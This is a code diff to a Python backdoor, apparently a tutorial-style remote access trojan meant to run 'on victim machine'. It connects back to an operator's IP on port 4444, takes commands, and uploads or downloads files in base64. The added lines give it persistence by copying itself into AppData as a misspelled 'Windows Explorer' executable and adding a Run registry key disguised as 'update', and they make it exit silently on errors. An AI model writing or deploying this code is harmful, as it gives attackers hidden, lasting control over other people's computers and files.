@@ -1,15 +1,24 @@
 #!/usr/bin/env python3
-
+#file should exists on victim machine
 import socket
 import subprocess
 import json
 import os
-import base64  
+import base64  # Import base64 for encoding file content
+import sys
+import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persitent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persitent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Exlplorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)   
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -32,11 +41,11 @@ class Backdoor:
 
     def read_file(self, path):
         with open(path, "rb") as file:
-            return base64.b64encode(file.read()).decode("utf-8")  
+            return base64.b64encode(file.read()).decode("utf-8")  # Encode file content to base64
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(base64.b64decode(content))  
+            file.write(base64.b64decode(content))  # Decode base64 content before writing
             return "[+] Upload successful"
 
 
@@ -49,7 +58,7 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.reliable_receive() 
+            command = self.reliable_receive()  # Receive command
             try:
                 if command[0] == "exit":
                     self.connection.close()
@@ -68,6 +77,8 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
-
-my_backdoor = Backdoor("local ip", port)
-my_backdoor.run()
+try:
+	my_backdoor = Backdoor("your ip", 4444)
+	my_backdoor.run()
+except Exception:
+	sys.exit()
